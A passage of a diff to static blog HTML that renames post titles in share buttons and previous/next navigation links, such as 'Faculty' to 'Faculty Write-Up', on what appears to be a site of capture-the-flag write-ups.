+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fmostxeon.github.io%2fposts%2ffaculty%2f&amp;t=Faculty%20Write-Up" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
   <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
 			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
     </div>
@@ -555,7 +577,7 @@
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Faculty&amp;url=https%3a%2f%2fmostxeon.github.io%2fposts%2ffaculty%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Faculty%20Write-Up&amp;url=https%3a%2f%2fmostxeon.github.io%2fposts%2ffaculty%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
   <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
     </div>
@@ -578,7 +600,7 @@
             <span class="button previous">
                 <a href="https://mostxeon.github.io/posts/trick/">
                     <span class="button__icon">←</span>
-                    <span class="button__text">Trick</span>
+                    <span class="button__text">Trick Write-Up</span>
                 </a>
             </span>
             
@@ -586,7 +608,7 @@
             
             <span class="button next">
                 <a href="https://mostxeon.github.io/posts/opensource/">
-                    <span class="button__text">Opensource</span>
+                    <span class="button__text">Opensource Write-Up</span>
                     <span class="button__icon">→</span>
                 </a>
             </span>
